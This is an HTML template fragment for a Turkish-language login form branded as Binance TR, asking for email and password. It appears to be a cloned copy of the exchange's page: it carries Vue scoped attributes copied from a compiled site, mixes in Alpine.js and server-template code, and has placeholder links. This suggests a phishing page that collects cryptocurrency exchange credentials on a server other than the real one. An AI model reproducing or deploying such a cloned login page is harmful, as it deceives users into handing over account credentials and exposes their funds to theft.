<main data-v-5c4d12e5="" data-v-905421cc="" id="loginMain">
    <section data-v-6408680b="" data-v-5c4d12e5="">
      <h2 data-v-6408680b="">Giriş Yap</h2>
      <div class="login-box" data-v-6408680b="">
        <div class="loading" style="display:none;" data-v-6408680b="">
          <div class="groove" data-v-6408680b="">
            <div class="bar" data-v-6408680b=""></div>
          </div>
      </div>
        <form action="#" method="POST" autocomplete="off" name="email">
          {{@csrf_field()}}            
          <div class="create-account" data-v-6408680b="" data-v-5c4d12e5=""> Binance TR hesabıyla oturum açın: </div>
          
                            <div class="input-model input-mg20" data-v-4d51f6f4="" data-v-5c4d12e5="" data-v-6408680b="">
              <div class="dynamic-placeholder pemail" data-v-4d51f6f4="">E-posta</div>
                <input type="text" id="email" name="email" x-model="email" data-v-4d51f6f4="" autocomplete="email" @focus="handleFocus" @input="handleInput" @blur="handleBlur">
              <div class="icon-wrap" data-v-4d51f6f4=""></div>
              <div data-v-4d51f6f4="" class="input-error err-tip d-none" x-show="emailError">Lütfen geçerli bir e-posta girin</div>
            </div>
          
          <div class="input-model input-mg20" data-v-4d51f6f4="" data-v-5c4d12e5="" data-v-6408680b="">
            <div class="dynamic-placeholder ppassword" data-v-4d51f6f4="">Şifre</div>
            <input type="password" id="password" name="password" data-v-4d51f6f4="">
            <div class="icon-wrap" data-v-4d51f6f4="" @click="togglePassword">
              <div data-v-4d51f6f4="">
                <svg aria-hidden="true" class="icon" data-v-4d51f6f4="">
                  <use :xlink:href="showPassword ? '#iconeye' : '#iconhidepwd'" data-v-4d51f6f4=""></use>
                </svg>
              </div>
            </div>
            <div data-v-4d51f6f4="" class="input-error pass-err d-none">
              En az 8 karakterden oluşmalı ve en az bir büyük harf, bir küçük harf ve bir rakam içermelidir.
            </div>
          </div>

          <button class="bc-btn bc-btn-yellow sensors-login" data-v-6408680b="" data-v-5c4d12e5="">Giriş Yap</button>
          
          <div class="more" data-v-6408680b="" data-v-5c4d12e5="">
            <div data-v-6408680b="" data-v-5c4d12e5="">
              <a data-v-5c4d12e5="" data-v-6408680b="">Şifrenizi mi unuttunuz?</a>
            </div>
            <div data-v-6408680b="" data-v-5c4d12e5="">
              <a data-v-5c4d12e5="" data-v-6408680b="">Kaydol</a>
            </div>
          </div>
        </form>
      </div>
    </section>
  </main>